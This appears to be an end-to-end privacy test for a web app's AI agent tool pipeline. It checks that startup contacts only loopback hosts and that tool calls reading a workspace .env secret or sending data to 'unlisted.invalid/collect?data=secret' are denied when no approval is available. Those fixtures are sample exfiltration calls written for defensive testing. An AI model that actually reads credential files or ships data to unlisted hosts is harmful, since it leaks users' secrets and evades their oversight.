/**
 * Privacy and sensitive-access acceptance of the DSHC Web composition, booted
 * from the shipped bundle patches through the Loader. While the app boots and
 * idles on the home screen, neither the browser nor the in-process Host
 * contacts a host other than loopback. Through the composed tool pipeline, a
 * read of a workspace `.env` file and a data-carrying fetch to an unlisted
 * site need approval; with no agent to route the approval through, the
 * pipeline denies them before the tool runs, while an ordinary read passes.
 * The presets register the real tools per agent, so the test registers
 * stand-in `read` and `web_fetch` tools on the composed root; the policy
 * judges calls by tool name and arguments.
 */
import { subscribe, unsubscribe } from 'node:diagnostics_channel'
import type { ClientRequest } from 'node:http'
import { readFileSync, writeFileSync } from 'node:fs'
import { readFile } from 'node:fs/promises'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { chromium, type Browser } from 'playwright'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { ToolCallId } from '@deepseek-ai/dsh-llm'
import { defineContentToolFixture, executeModelToolFixture } from '@deepseek-ai/dsh-tool-testkit'
import { launchWebScaffold, type WebScaffold } from './scaffold.ts'
import { connectFreshWorkspace, newEnglishPage, saveFailureShot } from './support.ts'

const DSHC_BUNDLE = new URL('../../../packages/bundle/dshc/', import.meta.url)
const DSHC_MANIFEST = JSON.parse(readFileSync(new URL('package.json', DSHC_BUNDLE), 'utf8')) as { dsh: { bundle: { patch: string[] } } }
const LOOPBACK = new Set(['127.0.0.1', 'localhost', '::1', '[::1]'])

/** Hosts the in-process Host contacted through `fetch`, `http`, or `https`. */
const hostRequests = new Set<string>()

function onFetch(message: unknown): void {
  const origin = (message as { request?: { origin?: string } }).request?.origin
  if (origin !== undefined && URL.canParse(origin)) hostRequests.add(new URL(origin).hostname)
}

function onHttp(message: unknown): void {
  const request = (message as { request?: ClientRequest }).request
  if (request !== undefined) hostRequests.add(request.host)
}

let scaffold: WebScaffold
let browser: Browser

beforeAll(async () => {
  subscribe('undici:request:create', onFetch)
  subscribe('http.client.request.start', onHttp)
  scaffold = await launchWebScaffold({
    extraOverlayPath: DSHC_MANIFEST.dsh.bundle.patch.map(patch => fileURLToPath(new URL(patch, DSHC_BUNDLE))),
    extraInstallAnchors: [fileURLToPath(new URL('package.json', DSHC_BUNDLE))],
    // The scaffold pins the upstream `standard` preset, which DSHC disables.
    agentPresets: { default: 'chat' },
  })
  browser = await chromium.launch()
})

afterAll(async () => {
  unsubscribe('undici:request:create', onFetch)
  unsubscribe('http.client.request.start', onHttp)
  try { await browser?.close() }
  finally { await scaffold?.close() }
})

describe('web e2e: DSHC privacy', () => {
  it('contacts no external host while booting and idling on the home screen', async () => {
    const page = await newEnglishPage(browser)
    const browserRequests = new Set<string>()
    page.on('request', (request) => {
      const url = new URL(request.url())
      if (url.protocol === 'http:' || url.protocol === 'https:' || url.protocol === 'ws:' || url.protocol === 'wss:') browserRequests.add(url.hostname)
    })
    try {
      await page.goto(scaffold.authenticatedUrl, { waitUntil: 'load' })
      await page.getByRole('button', { name: 'Choose a workspace to start', exact: true }).waitFor()
      await connectFreshWorkspace(page, scaffold.workspaceCwd, 'privacy', 'How can I help you today?')
      // Idle window: background fetchers that start after boot run here.
      await page.waitForTimeout(5_000)
      expect([...browserRequests].filter(host => !LOOPBACK.has(host))).toEqual([])
      expect([...hostRequests].filter(host => !LOOPBACK.has(host))).toEqual([])
    } catch (error) {
      await saveFailureShot(page, 'web-e2e-dshc-privacy')
      throw error
    } finally {
      await page.close()
    }
  })
})

describe('web e2e: DSHC sensitive access', () => {
  const signal = new AbortController().signal
  const fetched: string[] = []

  beforeAll(() => {
    const read = scaffold.ctx.tools.register(defineContentToolFixture({
      name: 'read', description: 'stand-in read', parameters: { file_path: { type: 'string', required: true } },
      async execute(args) { return [{ type: 'text' as const, text: await readFile(args.file_path, 'utf8') }] },
    }))
    const fetch = scaffold.ctx.tools.register(defineContentToolFixture({
      name: 'web_fetch', description: 'stand-in fetch', parameters: { url: { type: 'string', required: true } },
      async execute(args) { fetched.push(args.url); return [{ type: 'text' as const, text: 'fetched' }] },
    }))
    return () => { read(); fetch() }
  })
  const call = (name: string, args: Record<string, unknown>) =>
    executeModelToolFixture(scaffold.ctx, { callId: ToolCallId(`sensitive-${name}`), name, arguments: args, signal })

  it('reads an ordinary workspace file but needs approval for a workspace .env file', async () => {
    writeFileSync(join(scaffold.workspaceCwd, 'notes.txt'), 'ordinary notes')
    writeFileSync(join(scaffold.workspaceCwd, '.env'), 'TOKEN=secret')
    const ordinary = await call('read', { file_path: join(scaffold.workspaceCwd, 'notes.txt') })
    expect(ordinary.isError).toBe(false)
    expect(JSON.stringify(ordinary.content)).toContain('ordinary notes')
    const secret = await call('read', { file_path: join(scaffold.workspaceCwd, '.env') })
    expect(secret.isError).toBe(true)
    expect(secret.error?.info).toMatchObject({ code: 'APPROVAL_UNAVAILABLE' })
    expect(JSON.stringify(secret.content)).not.toContain('TOKEN=secret')
  })

  it('needs approval before a fetch carries data to an unlisted site, without contacting it', async () => {
    hostRequests.clear()
    const result = await call('web_fetch', { url: 'https://unlisted.invalid/collect?data=secret' })
    expect(result.isError).toBe(true)
    expect(result.error?.info).toMatchObject({ code: 'APPROVAL_UNAVAILABLE' })
    expect(fetched).toEqual([])
    expect(hostRequests.has('unlisted.invalid')).toBe(false)
  })
})
